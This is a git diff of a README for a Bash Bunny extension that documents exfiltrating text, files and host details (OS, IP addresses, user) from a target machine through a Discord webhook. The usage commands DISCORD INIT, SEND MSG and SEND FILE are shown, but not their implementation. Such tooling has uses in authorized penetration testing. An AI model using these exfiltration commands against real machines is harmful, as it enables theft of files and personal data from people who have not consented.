@@ -1,12 +1,14 @@
 <div align="center">
 
-# OSX Extension
-**This bashbunny extension provide some OSX specific command
+# Discord Exfiltration
+**This bashbunny extension provide exfiltration of text and files through discord webhook**
 
 ![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
 ![Quack](https://img.shields.io/badge/Ducky_Script-121011?style=for-the-badge&logo=duck&logoColor=white)
 
 ![OSX](https://img.shields.io/badge/OSX-FFFFFF?style=for-the-badge&logo=apple&logoColor=black)
+![Windows](https://img.shields.io/badge/Windows-357EC7?style=for-the-badge&logo=windows&logoColor=white)
+![Linux](https://img.shields.io/badge/Linux-eab838?style=for-the-badge&logo=linux&logoColor=white)
 
 [Documentation](#documentation) • [Changelog](#changelog) • [Contributing](#contributing) • [License](#license)  . [Support](#support)
 
@@ -15,16 +17,35 @@
 <img width="1000" alt="demoGif" src="https://raw.githubusercontent.com/quentinlamamy/bashbunny/main/img/discordExfiltration.gif"/>
 
 # Documentation
+> This extension need a terminal opened on target side
 
-## Terminal
+>To use this extension, you need to create a webhook on discord and get the webhook id and token
+During your setup steps, you need to set the DISCORD_WEBHOOK_ID and DISCORD_WEBHOOK_TOKEN variables
 
-### Open
-Open the terminal app
 ```bash
-OSX TERMINAL OPEN
-````
-### Init
+DISCORD_WEBHOOK_ID="<DISCORD_WEBHOOK_ID>"
+DISCORD_WEBHOOK_TOKEN="<DISCORD_WEBHOOK_TOKEN>"
+```
 
+### DISCORD INIT
+
+Initialize the exfiltration session by posting an embed message on discord with host information
+This command need ```$BB_HOST_OS, $BB_HOST_IP_V4, $BB_HOST_IP_V6, BB_HOST_IP_USER``` variables to be set (Set by default if you use my OSX extension)
+
+## DISCORD SEND MSG
+
+Send a message to discord via webhook
+
+```bash
+DISCORD SEND MSG $yourMessage
+```
+
+## DISCORD SEND FILE
+
+Send a file to discord via webhook
+```bash
+DISCORD SEND FILE $yourFilePath
+```
 
 # Changelog
 v1.0 : 
